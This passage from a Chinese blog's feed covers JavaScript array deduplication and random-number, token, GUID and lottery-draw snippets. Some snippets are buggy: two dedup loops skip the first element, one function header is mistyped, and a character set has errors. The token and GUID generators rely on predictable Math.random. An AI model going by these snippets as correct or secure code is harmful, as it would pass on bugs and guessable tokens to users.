class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">利用对象键值唯一性，如果对象没有该属性，则添加该属性，同时将该元素push到临时数组</span><br><span class="line">function uniqArr3(arr) &#123;</span><br><span class="line">　　var obj = &#123;&#125;,</span><br><span class="line">　　res = [];</span><br><span class="line"> </span><br><span class="line">　　for (var i = 1,len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">　　　　if (!obj[arr[i]]) &#123;</span><br><span class="line">　　　　　　obj[arr[i]] = true;</span><br><span class="line">　　　　　　res.push(arr[i]);</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line"> </span><br><span class="line">　　return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">同样利用对象键值唯一性，唯一不同的地方是这里不再使用临时数组变量，而是利用Object.keys()方法将去重后的结果返回</span><br><span class="line">function uniqArr4(arr) &#123;</span><br><span class="line">　　var obj = &#123;&#125;;</span><br><span class="line">　　for (var i = 1,len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">　　　　if (!obj[arr[i]]) &#123;</span><br><span class="line">　　　　　　obj[arr[i]] = true;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">　　</span><br><span class="line">　　return Object.keys(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">先对原数组进行排序，临时数组先存储第一个元素，然后从第二个元素开始循环判断排序后的原数组(arr)是否与临时数组(res)的第length-1个元素(即res的最后一个元素，也即res每次新添加的元素)是否相等，若不相等，则push到res，这样就确保了每次push到res中的都是不重复的。</span><br><span class="line">function uniqArr5(arr) &#123;</span><br><span class="line">　　arr.sort();</span><br><span class="line">　　var res = [arr[0]];</span><br><span class="line"> </span><br><span class="line">　　for (var i = 1,len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">　　　　if (arr[i] !== res[res.length -1]) &#123;</span><br><span class="line">　　　　　　res.push(arr[i]);</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">　　return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">嵌套循环，如果相等，则截掉后面的，这里要注意splice会影响到原数组，所以这里重新计算了len值和j值。</span><br><span class="line">unction uniqArr6(arr) &#123;</span><br><span class="line">　　var len = arr.length;</span><br><span class="line"> </span><br><span class="line">　　for (var i = 0; i &lt; len; i++) &#123;</span><br><span class="line">　　　　for (var j = i + 1; j &lt; len; j++) &#123;</span><br><span class="line">　　　　　　if (arr[i] === arr[j]) &#123;</span><br><span class="line">　　　　　　　　arr.splice(j, 1);</span><br><span class="line">　　　　　　　　len = arr.length;</span><br><span class="line">　　　　　　　　j--;</span><br><span class="line">　　　　　　&#125;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line"> </span><br><span class="line">　　return arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ES6新的数据结构set，类似数组，但成员的值都是唯一的，所以利用这个特性可以做到数组去重</span><br><span class="line"></span><br><span class="line">function uniqArr7(arr) &#123;</span><br><span class="line">　　var res = new Set(arr);</span><br><span class="line">　　return [...res];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function unique7 (arr) &#123;</span><br><span class="line">  return Array.from(new Set(arr))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// ES6</span><br><span class="line">function unique8 (arr) &#123;</span><br><span class="line">  const seen = new Map()</span><br><span class="line">  return arr.filter((a) =&gt; !seen.has(a) &amp;&amp; seen.set(a, 1))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#ABOUT ARRAY&lt;/p&gt;
&lt;h4 id=&quot;Array构造器&quot;&gt;&lt;a href=&quot;#Array构造器&quot; class=&quot;headerlink&quot; title=&quot;Array构造器&quot;&gt;&lt;/a&gt;Array构造器&lt;/h4&gt;&lt;figure class=&quot;highlight java
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>js随机数与简单抽奖</title>
    <link href="http://swingboy.github.io/2017/12/10/js%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E6%8A%BD%E5%A5%96/"/>
    <id>http://swingboy.github.io/2017/12/10/js随机数与简单抽奖/</id>
    <published>2017-12-10T02:23:57.000Z</published>
    <updated>2019-11-23T14:30:23.147Z</updated>
    
    <content type="html"><![CDATA[<p>#####<br>随机数分为三种：真随机数、准随机数、伪随机数。<br>真随机数是属于大自然的，真随机数只能通过随机的物理过程来获取，实际中是很难的。<br>准随机数来自于严格的数学方法，理论上可行，但实际上不可行。</p><p>伪随机数，就是假的随机数。因为它是根据某种已知的方法获取随机数，本质上已经去除了真正随机的可能。这种方法一旦重复，则获取到的随机数也会重复。</p><p>为什么是伪随机数呢？因为通过这种方式得到的“随机数”都是系统根据公式算出来的！既然是算出来的，那么只要输入的参数一致，那么每次获得的随机数就是同一个。输入的参数我们叫做seed。也就是说，如果程序设计者使用了一个预先确定好的seed来生成随机数，如果抽100次奖，那么这100次中奖的都会是同一个人，或者同一批人。更有甚者，虽然每次使用的seed看似不同，但这批seed会让特定的一部分人中奖概率更大！</p><p>真随机数是电脑通过对一些没有规律的自然现象量化后得到的，比如热力学噪声、量子现象等。获取这些真随机数的获取代价显然比用时间做个seed高多了。如果大家觉得年会抽奖的算法有必要使用真随机数，也有办法做到，random.org这个网站就提供了一系列通过“大气噪声”获取随机数序列的在线API，通过这些API获取的随机数序列都是真随机数。</p><p>如何产生随机数：产生随机数的方法有很多种，什么斐波那契法、线性同余法、梅森旋转算法Mersenne twister等。</p><p>下面简单介绍下。</p><p>说到js 的随机数，不得不提的就是Math.random这个方法了。<br>该方法可返回介于 [0 ~ 1) 之间的一个随机数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var r = Math.random(); //生成0-1 的随机数。</span><br></pre></td></tr></table></figure></p><p>还有其他简单的方法，简单回顾一下。<br>Math.ceil  //对一个数进行上取整 返回值：返回大于或等于x，并且与之最接近的整数。<br>注：如果x是正数，则把小数“入”；如果x是负数，则把小数“舍”。</p><p>Math.floor<br>对一个数进行下取整。 返回值：返回小于或等于x，并且与之最接近的整数。<br>注：如果x是正数，则把小数“舍”；如果x是负数，则把小数“入”。</p><p>Math.round  四舍五入取整。</p><p>问题: 想求解1-x的随机数<br>var x = 100;<br>// 1.0-x之间的随机数：<br>Math.round(Math.random()*x);</p><p>问题：x至y之间的随机数<br>var x = 100;<br>var y = 200;<br>Math.round(Math.random()*(y-x)+x);</p><p>还可以通过下面这种方式产生：<br>var r = +new Date();<br>var r = (new Date()-0) % 15;</p><p>问题：随机产生六位数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var Num = &quot;&quot;; </span><br><span class="line">for(var i=0;i&lt;6;i++)&#123; </span><br><span class="line">    Num+= Math.floor(Math.random()*10); </span><br><span class="line">&#125;</span><br><span class="line">console.log(Num);</span><br></pre></td></tr></table></figure></p><p>问题：随机的token 生成方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var r = Math.random().toString(36).slice(2); </span><br><span class="line">//或者</span><br><span class="line">var r = Math.random().toString(36).slice(7);</span><br><span class="line">console.log(r);</span><br></pre></td></tr></table></figure></p><p>but，这样有个问题。<br>for(var i = 0; i&lt; 20; i++){<br>    console.log(Math.random().toString(36).slice(2));<br>}</p><p>for(var i = 0; i&lt; 20; i++){<br>    console.log((+new Date()).toString(36));<br>}</p><p>问题：如果想不要数字和字母呢？<br>当然是正则了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var r = Math.random().toString(36).replace(/[^a-z]+/g, &apos;&apos;);</span><br><span class="line">//或者这样</span><br><span class="line">var r = Math.random().toString(36).slice(2).replace(/\d/g, &apos;&apos;);</span><br></pre></td></tr></table></figure><p>问题：从指定的字符中，抽取某一部分当做随机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array(20).fill().map(function () &#123;</span><br><span class="line">    return (function (str) &#123;</span><br><span class="line">        return str.charAt(Math.floor(Math.random() * str.length));</span><br><span class="line">    &#125;(&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&apos;));</span><br><span class="line"></span><br><span class="line">&#125;).join(&apos;&apos;);</span><br></pre></td></tr></table></figure><p>或者;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function rand(length, current) &#123;</span><br><span class="line">    var str = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz&quot;;</span><br><span class="line">    current = current ? current : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    return length ? rand(--length, str.charAt(Math.floor(Math.random() * 60)) + current) : current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当然上面的办法bijiaolow</p><p>还有下面这种办法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">** randomWord 产生任意长度随机字母数字组合</span><br><span class="line">** randomFlag-是否任意长度 min-任意长度最小位[固定位数] max-任意长度最大位</span><br><span class="line">*/</span><br><span class="line"> </span><br><span class="line">function randomWord(randomFlag, min, max)&#123;</span><br><span class="line">    var str = &quot;&quot;,</span><br><span class="line">        range = min,</span><br><span class="line">        arr = [&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;, &apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;];</span><br><span class="line"> </span><br><span class="line">    // 随机产生</span><br><span class="line">    if(randomFlag)&#123;</span><br><span class="line">        range = Math.round(Math.random() * (max-min)) + min;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(var i=0; i&lt;range; i++)&#123;</span><br><span class="line">        pos = Math.round(Math.random() * (arr.length-1));</span><br><span class="line">        str += arr[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var str = randomWord(true, 3, 32); //生成3-32位随机串</span><br><span class="line">console.log(str)</span><br><span class="line">randomWord(false, 43); //生成43位随机串</span><br></pre></td></tr></table></figure></p><p>问题：产生len长度的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function generateRandomAlphaNum(len) &#123;</span><br><span class="line">    var rdmString = &quot;&quot;;</span><br><span class="line">    for (; rdmString.length &lt; len; rdmString += Math.random().toString(36).substr(2));</span><br><span class="line"></span><br><span class="line">    return rdmString.substr(0, len);</span><br><span class="line">&#125;</span><br><span class="line">var str = generateRandomAlphaNum(5);</span><br><span class="line">// console.log(str);</span><br></pre></td></tr></table></figure></p><p>看下生成GUID的函数<br>什么是GUID：<br>全局唯一标识符（GUID，Globally Unique Identifier）也称作 UUID(Universally Unique IDentifier) 。</p><p>GUID是一种由算法生成的二进制长度为128位的数字标识符。GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”，其中的 x 是 0-9 或 a-f 范围内的一个32位十六进制数。在理想情况下，任何计算机和计算机集群都不会生成两个相同的GUID。</p><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function S4() &#123;</span><br><span class="line">    return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);</span><br><span class="line">&#125;</span><br><span class="line">function NewGuid() &#123;</span><br><span class="line">    return (S4() + S4() + &quot;-&quot; + S4() + &quot;-&quot; + S4() + &quot;-&quot; + S4() + &quot;-&quot; + S4() + S4() + S4());</span><br><span class="line">&#125;</span><br><span class="line">console.log(NewGuid());</span><br></pre></td></tr></table></figure></p><p>问题：如果想随机中文呢？<br>我们知道，中文字符的范围是[\u4e00-\u9fa5]</p><p>也就是我们常常写的判断是否中文的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (/^[\u4E00-\u9FA5]+$/.test(content)) &#123;</span><br><span class="line">    console.log(&apos;is chinese&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我们转化一下为10进制数字</span><br><span class="line">parseInt(&quot;4E00&quot;,16) //19968</span><br><span class="line">parseInt(&quot;9FA5&quot;,16) //40869</span><br><span class="line"></span><br><span class="line">40869-19968 = 20901 可以有这么多了！！！ 基本上够用</span><br><span class="line"></span><br><span class="line">randomHz = function()&#123;</span><br><span class="line">    eval( &quot;var word=&quot; +  &apos;&quot;\\u&apos; + (Math.round(Math.random() * 20901) + 19968).toString(16)+&apos;&quot;&apos;);</span><br><span class="line">    return word;</span><br><span class="line">&#125;</span><br><span class="line">for(i=0;i&lt;100;i++)&#123;</span><br><span class="line">    console.log(randomHz());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附：<br>下面上几个随机抽奖的小实例，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">let arr  = [</span><br><span class="line">    &#123;</span><br><span class="line">        name: &apos;奖品1&apos;,</span><br><span class="line">        per: 10,</span><br><span class="line">        end: 0,</span><br><span class="line">        times: 0</span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        name: &apos;奖品2&apos;,</span><br><span class="line">        per: 20,</span><br><span class="line">        times: 0</span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        name: &apos;奖品3&apos;,</span><br><span class="line">        per: 30,</span><br><span class="line">        times: 0</span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        name:&apos;谢谢&apos;,</span><br><span class="line">        per: 50,</span><br><span class="line">        times: 0</span><br><span class="line">    &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">let len = 0;</span><br><span class="line">arr.forEach((item, index)=&gt;&#123;</span><br><span class="line">    len += item.per;</span><br><span class="line">    item.end =len;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function draw()&#123;</span><br><span class="line">    let random = parseInt(Math.random() * len);</span><br><span class="line">    for(let i = 0 ; i&lt; arr.length; i++)&#123;</span><br><span class="line">        if(random &lt; arr[i].end)&#123;</span><br><span class="line">            // console.log(arr[i].name);</span><br><span class="line">            arr[i].times ++ ;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// draw();</span><br><span class="line"></span><br><span class="line">for(var j = 0; j &lt; 100000; j++)&#123;</span><br><span class="line">    draw();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr.forEach(function(item)&#123;</span><br><span class="line">    console.log(item.name, item.times);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var gifts = [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;奖品1&quot;,</span><br><span class="line">        &quot;prop&quot;:5, </span><br><span class="line">        &quot;times&quot;: 0</span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        &quot;name&quot;:&quot;奖品2&quot;,</span><br><span class="line">        &quot;prop&quot;:10,</span><br><span class="line">        &quot;times&quot;: 0</span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        &quot;name&quot;:&quot;奖品3&quot;,</span><br><span class="line">        &quot;prop&quot;:40,</span><br><span class="line">        &quot;times&quot;: 0</span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        &quot;name&quot;:&quot;奖品4&quot;,</span><br><span class="line">        &quot;prop&quot;: 45,</span><br><span class="line">        &quot;times&quot;: 0</span><br><span class="line">    &#125;</span><br><span class="line">];</span><br><span class="line">//抽奖经典算法</span><br><span class="line">function getResult(arr)&#123;</span><br><span class="line">    var leng = 0;</span><br><span class="line">    for(var i=0; i&lt;arr.length; i++)&#123;</span><br><span class="line">        leng+=arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    for(var i=0; i&lt;arr.length; i++)&#123;</span><br><span class="line">        if(parseInt(Math.random()*leng)&lt;arr[i])&#123;</span><br><span class="line">            gifts[i].times ++;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            leng -= arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var gArr = [];</span><br><span class="line">for(var i=0; i&lt; gifts.length; i++)&#123;</span><br><span class="line">    gArr.push(gifts[i][&apos;prop&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i =0 ; i&lt; 100000; i++)&#123;</span><br><span class="line">    getResult(gArr);</span><br><span class="line">&#125; </span><br><span class="line">gifts.forEach(function(item)&#123;</span><br><span class="line">    console.log(item.times);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// console.log(gifts[getResult(gArr)][&apos;name&apos;]);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">function draw(n = 1)&#123;</span><br><span class="line">    let cards = Array(20).fill().map((_, i)=&gt;i+1);</span><br><span class="line">    let ret = [];</span><br><span class="line">    for(let i = 0; i &lt; n; i++)&#123;</span><br><span class="line">        let idx = Math.floor(cards.length * Math.random());</span><br><span class="line">        ret.push(...cards.splice(idx, 1));</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line">console.log(draw(5));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function draw2(amount, n = 1)&#123;</span><br><span class="line">    const cards = Array(amount).fill().map((_, i)=&gt;i+1);</span><br><span class="line"></span><br><span class="line">    for(let i = amount - 1; i &gt;= 0; i--)&#123;</span><br><span class="line">        let rand = Math.floor((i + 1) * Math.random());</span><br><span class="line">        [cards[rand], cards[i]] = [cards[i], cards[rand]];</span><br><span class="line">    &#125;</span><br><span class="line">    return cards.slice(0, n);</span><br><span class="line">&#125;</span><br><span class="line">console.log(draw2(20, 5));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//-----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">function * draw3(amount)&#123;</span><br><span class="line">    const cards = Array(amount).fill().map((_,i)=&gt;i+1);</span><br><span class="line">    for(let i = amount - 1; i &gt;= 0; i--)&#123;</span><br><span class="line">        let rand = Math.floor((i + 1) * Math.random());</span><br><span class="line">        [cards[rand], cards[i]] =  [cards[i], cards[rand]];</span><br><span class="line">        yield cards[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var drawer = draw3(20);</span><br><span class="line">console.log(Array(5).fill().map(()=&gt;drawer.next().value));</span><br><span class="line"></span><br><span class="line">//------------------------------------------------</span><br><span class="line"></span><br><span class="line">//draw4</span><br><span class="line">function draw4(list = [], number = 0) &#123;</span><br><span class="line">    list = list.concat()</span><br><span class="line">    let result = []</span><br><span class="line">    while (number--) &#123;</span><br><span class="line">        result.push(list.splice(Math.floor(Math.random()*list.length), 1)[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">console.log(draw4([1,2,3,4,5,6,7,8,9,10], 5));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//------------------------------------------------</span><br><span class="line"></span><br><span class="line">var arr = Array(20).join(&apos;,&apos;).replace(/\,/g, function(a, b, arr)&#123;</span><br><span class="line">    //a ：元素，b：下标，c:数组</span><br><span class="line">    var n = +b + 1;</span><br><span class="line">    var m = n + (n == arr.length ? &apos;&apos;: &apos;.&apos;);</span><br><span class="line"></span><br><span class="line">    return m;</span><br><span class="line">&#125;).split(&apos;.&apos;);</span><br><span class="line"></span><br><span class="line">function draw5()&#123;</span><br><span class="line">    var rst = function() &#123;</span><br><span class="line">        var r = Math.floor(Math.random() * arr.length);</span><br><span class="line">        return arr.splice(r, 1);</span><br><span class="line">    &#125;;</span><br><span class="line">    return rst;</span><br><span class="line">&#125;</span><br><span class="line">console.log(draw5()(), draw5()(), draw5()(), draw5()(), draw5()());</span><br></pre></td></tr></table></figure><div><br>参见： <a href="https://aotu.io/notes/2016/04/14/math-random/" target="_blank" rel="noopener">https://aotu.io/notes/2016/04/14/math-random/&lt;/&gt;<br></a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#####&lt;br&gt;随机数分为三种：真随机数、准随机数、伪随机数。&lt;br&gt;真随机数是属于大自然的，真随机数只能通过随机的物理过程来获取，实际中是很难的。&lt;br&gt;准随机数来自于严格的数学方法，理论上可行，但实际上不可行。&lt;/p&gt;
&lt;p&gt;伪随机数，就是假的随机数。因为它是根据某种
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
</feed>
